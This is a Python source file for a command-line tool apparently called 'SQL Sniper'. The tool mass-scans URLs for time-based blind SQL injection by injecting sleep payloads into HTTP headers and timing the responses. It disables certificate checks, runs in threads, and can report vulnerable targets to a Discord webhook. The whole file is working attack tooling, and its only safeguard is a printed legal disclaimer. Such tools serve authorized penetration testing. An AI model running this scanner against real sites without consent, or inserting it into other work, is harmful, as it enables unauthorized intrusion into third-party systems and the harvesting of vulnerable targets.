#!/usr/bin/env python3
# Coded by https://twitter.com/DanialHalo

import argparse
import sys
import requests
from urllib3.exceptions import InsecureRequestWarning
import os
import json
import validators
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from termcolor import colored
from colorama import Fore, Style, init
import time

  # Added import for colored text

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

detected = []
default_payloads_file = 'payloads.txt'
default_headers_file = 'headers.txt'

def is_valid_url(url):
    return validators.url(url)

def send_discord_notification(webhook_url, url, header, payload):
    discord_data = {
        "content": f"SQL injection detected!\nURL: {url}\nHeader: {header}\nPayload: {payload}"
    }
    requests.post(webhook_url, json=discord_data)

def validate_sql_injection(url, header, payload, discord_webhook=None, proxy=None):
    proxies = {'http': proxy, 'https': proxy} if proxy else None

    if url in detected:
        return

    try:

        normal_header = {h.split(': ')[0]: h.split(': ')[1] for h in [header]}
        response_normal = requests.get(url, headers=normal_header, verify=False, proxies=proxies)
        normal_time = response_normal.elapsed.total_seconds()
        print(colored(f"{Fore.BLUE}[Time Check]{Style.RESET_ALL} {Fore.WHITE} {url} normal response time is {response_normal.elapsed.total_seconds()} seconds{Style.RESET_ALL}", 'white'))

        # Validate with 15 seconds sleep
        payload_15 = payload.replace("%__TIME_OUT__%", "15")
        headers_15s = {h.split(': ')[0]: h.split(': ')[1] + payload_15 for h in [header]}
        response_15s = requests.get(url, headers=headers_15s, verify=False, proxies=proxies)
        print(colored(f"{Fore.BLUE}[False-Positive Check]{Style.RESET_ALL} {Fore.WHITE}Sleep time was set to 15 seconds: {url} Server Response Time is {response_15s.elapsed.total_seconds()} seconds{Style.RESET_ALL}", 'white'))

        if response_15s.elapsed.total_seconds() >= 14:
            payload_5 = payload.replace("%__TIME_OUT__%", "5")
            headers_5s = {h.split(': ')[0]: h.split(': ')[1] + payload_5 for h in [header]}
            response_5s = requests.get(url, headers=headers_5s, verify=False, proxies=proxies)

            print(colored(f"{Fore.BLUE}[False-Positive Check]{Style.RESET_ALL} {Fore.WHITE}Sleep time was set to 5 seconds: {url} Server Response Time is {response_5s.elapsed.total_seconds()} seconds{Style.RESET_ALL}", 'white'))
            if response_5s.elapsed.total_seconds() < response_15s.elapsed.total_seconds()/2+response_normal.elapsed.total_seconds():

                print(colored("~~~", 'green'))
                print(colored("[CONFIRMED] Time-base Blind Injection verified", 'green', attrs=['bold']))
                print(colored(f"    Target: {url}\n    Header: {header}\n    Vector: {payload}", 'green'))
                print(colored("~~~", 'green'))
                detected.append(url)
                if discord_webhook:
                    send_discord_notification(discord_webhook, url, headers_15s, payload)
            else:
                print(colored(f"[False-Positive]  {url} might be false positive. Test manually.", 'white'))
        else:
            print(colored(f"[False-Positive]  {url} is might be false positive. Test manually.", 'white'))

    except requests.RequestException as e:
        print(colored(f"[ERROR] An error occurred during validation: {e}", 'red'))

def process_url(url, sql_query, headers, discord_webhook, proxy):

    for header in headers:
        if url in detected:
            break
        # Modify the payload time for the initial request
        payload = sql_query.replace("%__TIME_OUT__%", "10")
        headers_dict = {h.split(': ')[0]: h.split(': ')[1] + payload for h in [header]}
        response = requests.get(url, headers=headers_dict, verify=False, proxies={'http': proxy, 'https': proxy})

        if response.elapsed.total_seconds() >= 9:
            print(colored(f"[DETECTED] SQL Injection found on {url}", 'red', attrs=['bold']))
            print(colored(f"{header} {payload}", 'white'))

            # Validate SQL injection

            if url not in detected:
                validate_sql_injection(url, header, sql_query, discord_webhook, proxy)

def read_headers_from_file(headers_file):
    if not os.path.isfile(headers_file):
        print(colored(f"[ERROR] The specified headers file '{headers_file}' does not exist.", 'red'))
        return []

    with open(headers_file, 'r') as file:
        return file.read().splitlines()

def main():


    print("""

███████╗ ██████╗ ██╗     ██╗    ███████╗███╗   ██╗██╗██████╗ ███████╗██████╗
██╔════╝██╔═══██╗██║     ██║    ██╔════╝████╗  ██║██║██╔══██╗██╔════╝██╔══██╗
███████╗██║   ██║██║     ██║    ███████╗██╔██╗ ██║██║██████╔╝█████╗  ██████╔╝
╚════██║██║▄▄ ██║██║     ██║    ╚════██║██║╚██╗██║██║██╔═══╝ ██╔══╝  ██╔══██╗
███████║╚██████╔╝███████╗██║    ███████║██║ ╚████║██║██║     ███████╗██║  ██║
╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝    ╚══════╝╚═╝  ╚═══╝╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝

                            -: By Muhammad Danial :-
""")

    parser = argparse.ArgumentParser(description='Detect SQL injection by sending malicious queries')
    parser.add_argument('-u', '--url', help='Single URL for the target')
    parser.add_argument('-r', '--urls_file', help='File containing a list of URLs')
    parser.add_argument('-p', '--pipeline', action='store_true', help='Read from pipeline')
    parser.add_argument('--proxy', help='Proxy for intercepting requests (e.g., http://127.0.0.1:8080)', default=None)
    parser.add_argument('--payload', help='File containing malicious payloads (default is payloads.txt)', default=default_payloads_file)
    parser.add_argument('--single-payload', help='Single payload for testing')
    parser.add_argument('--discord', help='Discord Webhook URL')
    parser.add_argument('--headers', help='File containing headers (default is headers.txt)', default=default_headers_file)
    parser.add_argument('--threads', type=int, help='Number of threads', default=1)

    args = parser.parse_args()

    if args.url:
        urls = [args.url]
    elif args.urls_file:
        if not os.path.isfile(args.urls_file):
            print(colored(f"[ERROR] The specified file does not exist.", 'red'))
            return

        with open(args.urls_file, 'r') as file:
            url_lines = file.read().splitlines()
            unique_urls = list(set(url_lines))
            urls = unique_urls
    elif args.pipeline:
        # Read URLs from pipeline
        url_lines = [url.strip() for url in sys.stdin.readlines()]
        unique_urls = list(set(url_lines))

        if len(unique_urls) < len(url_lines):
            print(f"Removing {len(url_lines) - len(unique_urls)} duplicate URLs.")

        urls = unique_urls
    else:
        parser.error('Please provide either a single URL, a file with a list of URLs, or use the pipeline option.')

    payloads_file = args.payload

    if args.single_payload:
        payloads = [args.single_payload]
    elif os.path.isfile(payloads_file):
        with open(payloads_file, 'r') as file:
            payloads = file.read().splitlines()
    else:
        print(colored(f"[ERROR] The specified payload file '{payloads_file}' does not exist.", 'red'))
        return

    headers_file = args.headers
    headers = read_headers_from_file(headers_file)

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        print(colored("\n\033[3;93mLegal Disclaimer: Usage of this tool for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state, and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.\033[0m", 'yellow'))
        start_time = datetime.now()  # Record the start time
        print(colored(f"\n[*] Starting @ {start_time.strftime('%H:%M:%S %Y-%m-%d')}\n\n", 'white'))
        for url in urls:
            if url in detected:
                return
            if is_valid_url(url):
                for sql_query in payloads:
                    if url in detected:
                        break
                    executor.submit(process_url, url, sql_query, headers, args.discord, args.proxy)
            else:
                print(colored(f"[ERROR] Invalid URL: {url}", 'red'))

    end_time = datetime.now()  # Record the end time
    print(colored(f"\n\n[*] Finished @ {end_time.strftime('%H:%M:%S %Y-%m-%d')}", 'white'))
    print(colored(f"[*] Duration: {end_time - start_time}", 'white'))

if __name__ == '__main__':
    main()
